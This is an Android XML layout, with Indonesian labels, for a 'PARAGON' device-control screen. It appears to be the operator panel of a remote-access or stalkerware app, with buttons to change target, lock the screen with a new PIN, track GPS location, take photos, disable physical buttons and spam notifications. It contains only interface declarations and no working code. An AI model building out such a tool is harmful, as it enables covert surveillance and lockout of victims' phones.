<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#0A0A0A"
    android:orientation="vertical"
    android:padding="16dp">

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="PARAGON"
        android:textColor="#00FF41"
        android:textSize="28sp"
        android:textStyle="bold"
        android:layout_marginBottom="24dp"
        android:layout_gravity="center"/>

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="KONTROL DEVICE"
        android:textColor="#00FF41"
        android:textSize="18sp"
        android:textStyle="bold"
        android:layout_marginBottom="24dp"/>

    <Button
        android:id="@+id/btnGanti"
        android:layout_width="match_parent"
        android:layout_height="48dp"
        android:text="GANTI TARGET"
        android:textColor="#00FF41"
        android:background="@drawable/tombol_border"
        android:layout_marginBottom="16dp"/>

    <Switch
        android:id="@+id/swLockScreen"
        android:layout_width="match_parent"
        android:layout_height="56dp"
        android:text="Lock Screen"
        android:textColor="#FFFFFF"
        android:thumbTint="#FF1744"
        android:trackTint="#333333"
        android:layout_marginBottom="16dp"/>

    <EditText
        android:id="@+id/etNewPin"
        android:layout_width="match_parent"
        android:layout_height="48dp"
        android:hint="PIN baru (4 digit)"
        android:inputType="numberPassword"
        android:textColor="#FFFFFF"
        android:textColorHint="#666666"
        android:background="@drawable/edittext_border"
        android:padding="12dp"
        android:layout_marginBottom="16dp"/>

    <Button
        android:id="@+id/btnSetPin"
        android:layout_width="match_parent"
        android:layout_height="48dp"
        android:text="SET PIN"
        android:textColor="#0A0A0A"
        android:background="#00FF41"
        android:textStyle="bold"
        android:layout_marginBottom="24dp"/>

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="FITUR TAMBAHAN"
        android:textColor="#00FF41"
        android:textSize="18sp"
        android:textStyle="bold"
        android:layout_marginBottom="16dp"/>

    <Button
        android:id="@+id/btnGPS"
        android:layout_width="match_parent"
        android:layout_height="48dp"
        android:text="📍 GPS - Lacak Lokasi"
        android:textColor="#FFFFFF"
        android:background="#FF1744"
        android:layout_marginBottom="8dp"/>

    <Button
        android:id="@+id/btnCamera"
        android:layout_width="match_parent"
        android:layout_height="48dp"
        android:text="📸 Ambil Foto"
        android:textColor="#FFFFFF"
        android:background="#FF1744"
        android:layout_marginBottom="8dp"/>

    <Button
        android:id="@+id/btnWallpaper"
        android:layout_width="match_parent"
        android:layout_height="48dp"
        android:text="🖼 Ganti Wallpaper"
        android:textColor="#FFFFFF"
        android:background="#FF1744"
        android:layout_marginBottom="8dp"/>

    <Button
        android:id="@+id/btnBlockButtons"
        android:layout_width="match_parent"
        android:layout_height="48dp"
        android:text="🔒 Matiin Tombol Fisik"
        android:textColor="#FFFFFF"
        android:background="#FF1744"
        android:layout_marginBottom="8dp"/>

    <Button
        android:id="@+id/btnSpamNotif"
        android:layout_width="match_parent"
        android:layout_height="48dp"
        android:text="📨 Spam Notifikasi"
        android:textColor="#FFFFFF"
        android:background="#FF1744"
        android:layout_marginBottom="8dp"/>

    <TextView
        android:id="@+id/tvResult"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text=""
        android:textColor="#FFFFFF"
        android:textSize="14sp"
        android:layout_marginTop="16dp"/>

</LinearLayout>
